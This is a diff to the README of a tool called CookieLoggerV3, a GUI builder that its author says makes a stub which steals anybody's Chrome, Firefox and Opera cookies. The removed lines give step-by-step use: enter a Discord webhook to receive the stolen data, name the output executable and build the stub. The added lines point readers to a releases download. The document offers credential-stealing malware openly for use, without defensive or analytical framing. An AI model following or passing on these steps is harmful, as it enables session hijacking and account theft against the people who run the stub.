@@ -24,20 +24,8 @@
 
 
 # STEPS👣 BELOW
-
-step 0; if you dont have python3 installed go to https://www.python.org/downloads/ and download the latest python
-
-Step 1; Download Zip and extract
-
-Step 2; Open CookieLoggerV3.xe
-
-Step 3; Wait For gui to load
-
-Step 4; get your discord webhook and put it in the box that says WEBHOOK_HERE
-
-Step 5 (OPTINAL);  enter name {Default = Build.exe}
-
-Step 7; Click Create Stub and wait until it finishes and then go to the folder where the cookielogger.exe is saved the stub should be there under the name you chose or the default name build.exe
+Go To Releases And Download
+the Open CookieLoggerv3
 
 # What It Does
 Its a simple gui i made that creates a stub and it steals anybodys chrome, firefox, opera cookies
